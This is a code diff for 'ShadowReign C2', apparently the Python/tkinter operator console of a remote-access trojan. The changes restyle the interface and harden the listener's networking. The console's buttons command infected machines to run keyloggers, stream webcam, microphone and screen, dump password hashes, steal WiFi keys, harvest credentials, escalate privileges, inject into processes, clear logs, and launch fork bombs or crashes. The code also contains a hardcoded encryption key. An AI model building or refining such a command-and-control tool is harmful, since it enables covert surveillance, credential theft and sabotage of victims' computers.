@@ -14,8 +14,8 @@ class ShadowReignGUI:
     def __init__(self):
         self.root = tk.Tk()
         self.root.title("ShadowReign C2 - The Boss")
-        self.root.geometry("1200x800")
-        self.root.configure(bg="#1e1e1e")
+        self.root.geometry("1280x800")
+        self.root.configure(bg="#0A1B2A")  # Deep navy base
         self.HOST = "0.0.0.0"
         self.PORT = 5251
         self.KEY = b"ShadowReignBoss!"
@@ -28,52 +28,97 @@ class ShadowReignGUI:
         self.root.mainloop()
 
     def setup_ui(self):
+        # Custom Style
         style = ttk.Style()
         style.theme_use("clam")
-        style.configure("TNotebook", background="#1e1e1e", borderwidth=0)
-        style.configure("TNotebook.Tab", background="#2a2a2a", foreground="white", padding=[10, 5], font=("Arial", 12))
-        style.map("TNotebook.Tab", background=[("selected", "#ff4444")])
-        style.configure("Treeview", background="#333333", foreground="white", fieldbackground="#333333")
-        style.configure("Treeview.Heading", background="#2a2a2a", foreground="white", font=("Arial", 11, "bold"))
+        style.configure("TNotebook", background="#0A1B2A", borderwidth=0)
+        style.configure("TNotebook.Tab", 
+                        background="#1E3A5F",  # Darker blue
+                        foreground="#Aqua", 
+                        padding=[15, 8], 
+                        font=("Helvetica", 14, "bold"),
+                        borderwidth=0)
+        style.map("TNotebook.Tab", 
+                  background=[("selected", "#3B82F6")],  # Bright blue when selected
+                  foreground=[("selected", "#FFFFFF")])
+        style.configure("Treeview", 
+                        background="#1E3A5F", 
+                        foreground="#FFFFFF", 
+                        fieldbackground="#1E3A5F", 
+                        font=("Helvetica", 12))
+        style.configure("Treeview.Heading", 
+                        background="#143452", 
+                        foreground="#Aqua", 
+                        font=("Helvetica", 13, "bold"))
 
-        sidebar = tk.Frame(self.root, bg="#2a2a2a", width=300)
-        sidebar.pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=10)
-        tk.Label(sidebar, text="Connected Clients", bg="#2a2a2a", fg="white", font=("Arial", 14, "bold")).pack(pady=5)
-        self.client_list = ttk.Treeview(sidebar, columns=("ID", "IP", "OS", "Status", "Anti-VM"), show="headings", height=10)
+        # Sidebar
+        sidebar = tk.Frame(self.root, bg="#143452", width=350)  # Wider, water-dark
+        sidebar.pack(side=tk.LEFT, fill=tk.Y, padx=20, pady=20)
+        tk.Label(sidebar, 
+                 text="ShadowReign Clients", 
+                 bg="#143452", 
+                 fg="#FFFFFF", 
+                 font=("Helvetica", 18, "bold")).pack(pady=(20, 10))
+        
+        self.client_list = ttk.Treeview(sidebar, 
+                                        columns=("ID", "IP", "OS", "Status", "Anti-VM"), 
+                                        show="headings", 
+                                        height=12)
         self.client_list.heading("ID", text="ID")
         self.client_list.heading("IP", text="IP")
         self.client_list.heading("OS", text="OS")
         self.client_list.heading("Status", text="Status")
         self.client_list.heading("Anti-VM", text="Anti-VM")
-        self.client_list.column("ID", width=50)
-        self.client_list.column("IP", width=100)
-        self.client_list.column("OS", width=80)
-        self.client_list.column("Status", width=60)
-        self.client_list.column("Anti-VM", width=60)
+        self.client_list.column("ID", width=50, anchor="center")
+        self.client_list.column("IP", width=120, anchor="center")
+        self.client_list.column("OS", width=80, anchor="center")
+        self.client_list.column("Status", width=60, anchor="center")
+        self.client_list.column("Anti-VM", width=60, anchor="center")
         self.client_list.pack(fill=tk.Y, pady=10)
         self.client_list.bind("<<TreeviewSelect>>", self.select_client)
 
-        self.main_frame = tk.Frame(self.root, bg="#1e1e1e")
-        self.main_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)
-        tk.Label(self.main_frame, text="ShadowReign Control Center", bg="#1e1e1e", fg="white", font=("Arial", 16, "bold")).pack(pady=5)
+        # Main Frame
+        self.main_frame = tk.Frame(self.root, bg="#0A1B2A")
+        self.main_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=20, pady=20)
+        tk.Label(self.main_frame, 
+                 text="Control Center", 
+                 bg="#0A1B2A", 
+                 fg="#FFFFFF", 
+                 font=("Helvetica", 20, "bold")).pack(pady=(10, 20))
+        
         self.notebook = ttk.Notebook(self.main_frame)
         self.notebook.pack(fill=tk.BOTH, expand=True)
 
+        # Tabs
         tabs = {
-            "Keylogger": self.create_keylogger_tab,
+            "Keys": self.create_keylogger_tab,
             "Files": self.create_files_tab,
             "Media": self.create_media_tab,
             "System": self.create_system_tab,
-            "Pranks": self.create_pranks_tab,
+            "Chaos": self.create_pranks_tab,
             "Shell": self.create_shell_tab,
             "Live": self.create_live_tab,
             "Advanced": self.create_advanced_tab,
             "Remote": self.create_remote_tab,
         }
         for name, func in tabs.items():
-            tab = tk.Frame(self.notebook, bg="#1e1e1e")
+            tab = tk.Frame(self.notebook, bg="#0A1B2A")
             self.notebook.add(tab, text=name)
             func(tab)
+
+    def create_button(self, parent, text, command):
+        return tk.Button(parent, 
+                         text=text, 
+                         command=command, 
+                         bg="#3B82F6",  # Bright blue
+                         fg="#FFFFFF", 
+                         font=("Helvetica", 12, "bold"), 
+                         bd=0, 
+                         relief="flat", 
+                         padx=15, 
+                         pady=8, 
+                         activebackground="#60A5FA", 
+                         cursor="hand2")
 
     def encrypt(self, data):
         try:
@@ -96,15 +141,22 @@ class ShadowReignGUI:
             return None
 
     def send_message(self, sock, message):
-        encrypted = self.encrypt(message)
-        if not encrypted:
-            return
-        length = len(encrypted)
-        length_bytes = length.to_bytes(4, byteorder='big')
-        sock.send(length_bytes + encrypted.encode())
+        try:
+            encrypted = self.encrypt(message)
+            if not encrypted:
+                return
+            length = len(encrypted)
+            length_bytes = length.to_bytes(4, byteorder='big')
+            sock.sendall(length_bytes)
+            for i in range(0, len(encrypted), 1024):
+                sock.sendall(encrypted[i:i+1024].encode())
+                time.sleep(0.005)
+        except Exception:
+            pass
 
     def start_server(self):
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server.settimeout(30)
         self.server.bind((self.HOST, self.PORT))
         self.server.listen(50)
         threading.Thread(target=self.accept_clients, daemon=True).start()
@@ -114,16 +166,27 @@ class ShadowReignGUI:
         while True:
             try:
                 client_socket, addr = self.server.accept()
+                client_socket.settimeout(5)
+                ip = addr[0]
                 with self.clients_lock:
-                    self.clients[client_id] = (client_socket, {"ip": addr[0], "os": "Unknown", "status": "Online", "anti_vm": False})
-                threading.Thread(target=self.handle_client, args=(client_id,), daemon=True).start()
-                client_id += 1
+                    existing_id = None
+                    for cid, (sock, info) in self.clients.items():
+                        if info["ip"] == ip:
+                            existing_id = cid
+                            break
+                    if existing_id is not None:
+                        self.clients[existing_id] = (client_socket, {"ip": ip, "os": "Unknown", "status": "Reconnecting", "anti_vm": False})
+                    else:
+                        self.clients[client_id] = (client_socket, {"ip": ip, "os": "Unknown", "status": "Online", "anti_vm": False})
+                        client_id += 1
+                    threading.Thread(target=self.handle_client, args=(existing_id if existing_id is not None else client_id - 1,), daemon=True).start()
                 self.queue_gui_update()
             except Exception:
-                break
+                time.sleep(1)
 
     def handle_client(self, client_id):
-        sock = self.clients[client_id][0]
+        with self.clients_lock:
+            sock = self.clients[client_id][0]
         while True:
             try:
                 length_bytes = sock.recv(4)
@@ -133,11 +196,19 @@ class ShadowReignGUI:
                     self.queue_gui_update()
                     break
                 length = int.from_bytes(length_bytes, byteorder='big')
-                data = sock.recv(length).decode()
-                response = json.loads(self.decrypt(data))
+                data = b""
+                while len(data) < length:
+                    chunk = sock.recv(min(1024, length - len(data)))
+                    if not chunk:
+                        raise Exception("Socket closed")
+                    data += chunk
+                response = json.loads(self.decrypt(data.decode()))
                 with self.clients_lock:
                     self.clients[client_id][1].update(response)
-                self.process_response(client_id, response)
+                    if response.get("ping") != "heartbeat":
+                        self.clients[client_id][1]["status"] = "Online"
+                if response.get("ping") != "heartbeat":
+                    self.process_response(client_id, response)
             except Exception:
                 with self.clients_lock:
                     self.clients[client_id][1]["status"] = "Offline"
@@ -230,7 +301,7 @@ class ShadowReignGUI:
             self.selected_client = int(self.client_list.item(selected[0])["values"][0])
 
     def send_command(self, command, data=None):
-        if self.selected_client is None or self.clients.get(self.selected_client, [None])[1]["status"] != "Online":
+        if self.selected_client is None or self.clients.get(self.selected_client, [None])[1]["status"] not in ["Online", "Reconnecting"]:
             messagebox.showerror("Error", "No active client selected!")
             return
         with self.clients_lock:
@@ -241,20 +312,20 @@ class ShadowReignGUI:
             messagebox.showerror("Error", f"Failed to send command: {e}")
 
     def create_keylogger_tab(self, tab):
-        tk.Label(tab, text="Keylogger", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
-        tk.Button(tab, text="Start", command=lambda: self.send_command("keylogger_start"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Stop", command=lambda: self.send_command("keylogger_stop"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Dump Logs", command=lambda: self.send_command("keylogger_dump"), bg="#ff4444", fg="white").pack(pady=5)
-        self.keylog_display = tk.Text(tab, height=15, width=80, bg="#333333", fg="white")
-        self.keylog_display.pack(pady=10)
+        tk.Label(tab, text="Keylogger", bg="#0A1B2A", fg="#FFFFFF", font=("Helvetica", 16, "bold")).pack(pady=20)
+        self.create_button(tab, "Start", lambda: self.send_command("keylogger_start")).pack(pady=10)
+        self.create_button(tab, "Stop", lambda: self.send_command("keylogger_stop")).pack(pady=10)
+        self.create_button(tab, "Dump Logs", lambda: self.send_command("keylogger_dump")).pack(pady=10)
+        self.keylog_display = tk.Text(tab, height=15, width=80, bg="#1E3A5F", fg="#FFFFFF", font=("Helvetica", 11))
+        self.keylog_display.pack(pady=20)
 
     def create_files_tab(self, tab):
-        tk.Label(tab, text="File Management", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
-        tk.Button(tab, text="List Files", command=lambda: self.send_command("list_files"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Upload File", command=self.upload_file, bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Download File", command=self.download_file, bg="#ff4444", fg="white").pack(pady=5)
-        self.file_display = tk.Text(tab, height=15, width=80, bg="#333333", fg="white")
-        self.file_display.pack(pady=10)
+        tk.Label(tab, text="File Management", bg="#0A1B2A", fg="#FFFFFF", font=("Helvetica", 16, "bold")).pack(pady=20)
+        self.create_button(tab, "List Files", lambda: self.send_command("list_files")).pack(pady=10)
+        self.create_button(tab, "Upload File", self.upload_file).pack(pady=10)
+        self.create_button(tab, "Download File", self.download_file).pack(pady=10)
+        self.file_display = tk.Text(tab, height=15, width=80, bg="#1E3A5F", fg="#FFFFFF", font=("Helvetica", 11))
+        self.file_display.pack(pady=20)
 
     def upload_file(self):
         filepath = filedialog.askopenfilename()
@@ -271,19 +342,19 @@ class ShadowReignGUI:
             self.send_command("send_file", remote_path)
 
     def create_media_tab(self, tab):
-        tk.Label(tab, text="Media Capture", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
-        tk.Button(tab, text="Screenshot", command=lambda: self.send_command("screenshot"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Record Screen (10s)", command=lambda: self.send_command("record_screen"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Webcam Snap", command=lambda: self.send_command("webcam_snap"), bg="#ff4444", fg="white").pack(pady=5)
-        self.media_display = tk.Label(tab, bg="#333333")
-        self.media_display.pack(pady=10)
+        tk.Label(tab, text="Media Capture", bg="#0A1B2A", fg="#FFFFFF", font=("Helvetica", 16, "bold")).pack(pady=20)
+        self.create_button(tab, "Screenshot", lambda: self.send_command("screenshot")).pack(pady=10)
+        self.create_button(tab, "Record Screen (10s)", lambda: self.send_command("record_screen")).pack(pady=10)
+        self.create_button(tab, "Webcam Snap", lambda: self.send_command("webcam_snap")).pack(pady=10)
+        self.media_display = tk.Label(tab, bg="#1E3A5F")
+        self.media_display.pack(pady=20)
 
     def create_system_tab(self, tab):
-        tk.Label(tab, text="System Controls", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
-        tk.Button(tab, text="Dump Hashes", command=lambda: self.send_command("dump_hashes"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Steal WiFi", command=lambda: self.send_command("steal_wifi"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Elevate Privileges", command=lambda: self.send_command("elevate_privileges"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Toggle Anti-VM", command=self.toggle_anti_vm, bg="#ff4444", fg="white").pack(pady=5)
+        tk.Label(tab, text="System Controls", bg="#0A1B2A", fg="#FFFFFF", font=("Helvetica", 16, "bold")).pack(pady=20)
+        self.create_button(tab, "Dump Hashes", lambda: self.send_command("dump_hashes")).pack(pady=10)
+        self.create_button(tab, "Steal WiFi", lambda: self.send_command("steal_wifi")).pack(pady=10)
+        self.create_button(tab, "Elevate Privileges", lambda: self.send_command("elevate_privileges")).pack(pady=10)
+        self.create_button(tab, "Toggle Anti-VM", self.toggle_anti_vm).pack(pady=10)
 
     def toggle_anti_vm(self):
         if self.selected_client is not None:
@@ -292,11 +363,11 @@ class ShadowReignGUI:
             self.send_command("toggle_anti_vm", not current_state)
 
     def create_pranks_tab(self, tab):
-        tk.Label(tab, text="Pranks", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
-        tk.Button(tab, text="Jumpscare", command=lambda: self.send_command("jumpscare"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Crash System", command=lambda: self.send_command("crash_system"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Fork Bomb", command=lambda: self.send_command("fork_bomb"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Fake Alert", command=self.fake_alert, bg="#ff4444", fg="white").pack(pady=5)
+        tk.Label(tab, text="Chaos Tools", bg="#0A1B2A", fg="#FFFFFF", font=("Helvetica", 16, "bold")).pack(pady=20)
+        self.create_button(tab, "Jumpscare", lambda: self.send_command("jumpscare")).pack(pady=10)
+        self.create_button(tab, "Crash System", lambda: self.send_command("crash_system")).pack(pady=10)
+        self.create_button(tab, "Fork Bomb", lambda: self.send_command("fork_bomb")).pack(pady=10)
+        self.create_button(tab, "Fake Alert", self.fake_alert).pack(pady=10)
 
     def fake_alert(self):
         message = tk.simpledialog.askstring("Fake Alert", "Enter alert message:")
@@ -304,20 +375,20 @@ class ShadowReignGUI:
             self.send_command("fake_alert", {"message": message})
 
     def create_shell_tab(self, tab):
-        tk.Label(tab, text="Shell", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
-        self.shell_input = tk.Entry(tab, width=50, bg="#333333", fg="white")
-        self.shell_input.pack(pady=5)
-        tk.Button(tab, text="Run", command=lambda: self.send_command("shell", self.shell_input.get()), bg="#ff4444", fg="white").pack(pady=5)
-        self.shell_output = tk.Text(tab, height=15, width=80, bg="#333333", fg="white")
-        self.shell_output.pack(pady=10)
+        tk.Label(tab, text="Shell Access", bg="#0A1B2A", fg="#FFFFFF", font=("Helvetica", 16, "bold")).pack(pady=20)
+        self.shell_input = tk.Entry(tab, width=50, bg="#1E3A5F", fg="#FFFFFF", font=("Helvetica", 12), insertbackground="white")
+        self.shell_input.pack(pady=10)
+        self.create_button(tab, "Execute", lambda: self.send_command("shell", self.shell_input.get())).pack(pady=10)
+        self.shell_output = tk.Text(tab, height=15, width=80, bg="#1E3A5F", fg="#FFFFFF", font=("Helvetica", 11))
+        self.shell_output.pack(pady=20)
 
     def create_live_tab(self, tab):
-        tk.Label(tab, text="Live Streaming (Saved to Files)", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
-        tk.Button(tab, text="Stream Screen", command=lambda: self.send_command("stream_screen"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Stream Webcam", command=lambda: self.send_command("stream_webcam"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Stream Mic", command=lambda: self.send_command("stream_mic"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Stop Streams", command=lambda: self.send_command("stop_stream"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Record A/V", command=self.record_av, bg="#ff4444", fg="white").pack(pady=5)
+        tk.Label(tab, text="Live Streams", bg="#0A1B2A", fg="#FFFFFF", font=("Helvetica", 16, "bold")).pack(pady=20)
+        self.create_button(tab, "Stream Screen", lambda: self.send_command("stream_screen")).pack(pady=10)
+        self.create_button(tab, "Stream Webcam", lambda: self.send_command("stream_webcam")).pack(pady=10)
+        self.create_button(tab, "Stream Mic", lambda: self.send_command("stream_mic")).pack(pady=10)
+        self.create_button(tab, "Stop Streams", lambda: self.send_command("stop_stream")).pack(pady=10)
+        self.create_button(tab, "Record A/V", self.record_av).pack(pady=10)
 
     def record_av(self):
         duration = tk.simpledialog.askinteger("Record A/V", "Enter duration (seconds):")
@@ -326,14 +397,14 @@ class ShadowReignGUI:
             self.send_command("record_av", {"duration": duration, "type": type_})
 
     def create_advanced_tab(self, tab):
-        tk.Label(tab, text="Advanced Features", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
-        tk.Button(tab, text="Inject Process", command=self.inject_process, bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Queue Command", command=self.queue_command, bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Self-Destruct", command=lambda: self.send_command("self_destruct"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Harvest Credentials", command=lambda: self.send_command("harvest_creds"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Spoof Info", command=self.spoof_info, bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Clear Logs", command=lambda: self.send_command("clear_logs"), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Switch C2", command=self.switch_c2, bg="#ff4444", fg="white").pack(pady=5)
+        tk.Label(tab, text="Advanced Ops", bg="#0A1B2A", fg="#FFFFFF", font=("Helvetica", 16, "bold")).pack(pady=20)
+        self.create_button(tab, "Inject Process", self.inject_process).pack(pady=10)
+        self.create_button(tab, "Queue Command", self.queue_command).pack(pady=10)
+        self.create_button(tab, "Self-Destruct", lambda: self.send_command("self_destruct")).pack(pady=10)
+        self.create_button(tab, "Harvest Credentials", lambda: self.send_command("harvest_creds")).pack(pady=10)
+        self.create_button(tab, "Spoof Info", self.spoof_info).pack(pady=10)
+        self.create_button(tab, "Clear Logs", lambda: self.send_command("clear_logs")).pack(pady=10)
+        self.create_button(tab, "Switch C2", self.switch_c2).pack(pady=10)
 
     def inject_process(self):
         process_name = tk.simpledialog.askstring("Inject Process", "Enter process name (e.g., explorer.exe):")
@@ -358,20 +429,27 @@ class ShadowReignGUI:
             self.send_command("switch_c2", {"c2_list": eval(c2_list)})
 
     def create_remote_tab(self, tab):
-        tk.Label(tab, text="Remote Desktop", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
-        tk.Button(tab, text="Start Remote", command=lambda: self.send_command("remote_desktop", {"action": "start"}), bg="#ff4444", fg="white").pack(pady=5)
-        tk.Button(tab, text="Stop Remote", command=lambda: self.send_command("stop_stream"), bg="#ff4444", fg="white").pack(pady=5)
-        self.remote_x = tk.Entry(tab, width=10, bg="#333333", fg="white")
-        self.remote_x.pack(pady=5, side=tk.LEFT)
-        self.remote_y = tk.Entry(tab, width=10, bg="#333333", fg="white")
-        self.remote_y.pack(pady=5, side=tk.LEFT)
-        tk.Button(tab, text="Move Mouse", command=self.move_mouse, bg="#ff4444", fg="white").pack(pady=5, side=tk.LEFT)
-        tk.Button(tab, text="Click Mouse", command=lambda: self.move_mouse(click=True), bg="#ff4444", fg="white").pack(pady=5, side=tk.LEFT)
-        self.remote_key = tk.Entry(tab, width=10, bg="#333333", fg="white")
-        self.remote_key.pack(pady=5, side=tk.LEFT)
-        tk.Button(tab, text="Press Key", command=self.press_key, bg="#ff4444", fg="white").pack(pady=5, side=tk.LEFT)
-        self.remote_display = tk.Label(tab, bg="#333333")
-        self.remote_display.pack(pady=10)
+        tk.Label(tab, text="Remote Desktop", bg="#0A1B2A", fg="#FFFFFF", font=("Helvetica", 16, "bold")).pack(pady=20)
+        self.create_button(tab, "Start Remote", lambda: self.send_command("remote_desktop", {"action": "start"})).pack(pady=10)
+        self.create_button(tab, "Stop Remote", lambda: self.send_command("stop_stream")).pack(pady=10)
+        
+        control_frame = tk.Frame(tab, bg="#0A1B2A")
+        control_frame.pack(pady=10)
+        self.remote_x = tk.Entry(control_frame, width=10, bg="#1E3A5F", fg="#FFFFFF", font=("Helvetica", 12), insertbackground="white")
+        self.remote_x.pack(side=tk.LEFT, padx=5)
+        self.remote_y = tk.Entry(control_frame, width=10, bg="#1E3A5F", fg="#FFFFFF", font=("Helvetica", 12), insertbackground="white")
+        self.remote_y.pack(side=tk.LEFT, padx=5)
+        self.create_button(control_frame, "Move Mouse", self.move_mouse).pack(side=tk.LEFT, padx=5)
+        self.create_button(control_frame, "Click Mouse", lambda: self.move_mouse(click=True)).pack(side=tk.LEFT, padx=5)
+        
+        key_frame = tk.Frame(tab, bg="#0A1B2A")
+        key_frame.pack(pady=10)
+        self.remote_key = tk.Entry(key_frame, width=10, bg="#1E3A5F", fg="#FFFFFF", font=("Helvetica", 12), insertbackground="white")
+        self.remote_key.pack(side=tk.LEFT, padx=5)
+        self.create_button(key_frame, "Press Key", self.press_key).pack(side=tk.LEFT, padx=5)
+        
+        self.remote_display = tk.Label(tab, bg="#1E3A5F")
+        self.remote_display.pack(pady=20)
 
     def move_mouse(self, click=False):
         try:
